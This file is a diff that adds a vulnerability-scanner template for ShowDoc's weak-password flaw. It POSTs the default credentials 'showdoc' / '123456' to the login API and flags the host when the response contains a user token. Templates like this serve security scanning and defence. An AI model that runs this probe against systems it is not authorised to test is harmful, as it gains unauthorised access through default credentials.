@@ -1,0 +1,21 @@
+id: poc-yaml-showdoc-dashboard-weak-pass
+info:
+  name: ShowDoc 弱密码漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: ShowDoc
+  osprey-id: vb_2022_0066
+variables:
+  r_username: showdoc
+  r_password: 123456
+requests:
+- method: POST
+  path: /server/index.php?s=/api/user/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username={{.r_username}}&password={{.r_password}}&v_code=
+  expression: 'contains(body, "\"username\":\"showdoc\"") && contains(body, "\"user_token\":")
+
+    '
+transport: http
